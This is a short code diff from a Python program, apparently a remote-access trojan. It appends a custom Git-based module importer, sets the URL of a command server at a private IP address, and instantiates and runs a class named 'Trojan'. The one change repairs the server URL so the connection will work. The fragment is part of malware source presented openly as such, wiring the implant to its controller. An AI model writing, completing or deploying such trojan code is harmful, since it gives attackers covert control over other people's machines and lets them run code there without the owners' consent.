@@ -108,7 +108,7 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    NODE_SERVER_URL = "<http://10.0.100.100:3000>"  # Change this to your Node.js server URL
+    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
     trojan = Trojan('abc', NODE_SERVER_URL)
     trojan.run()
 
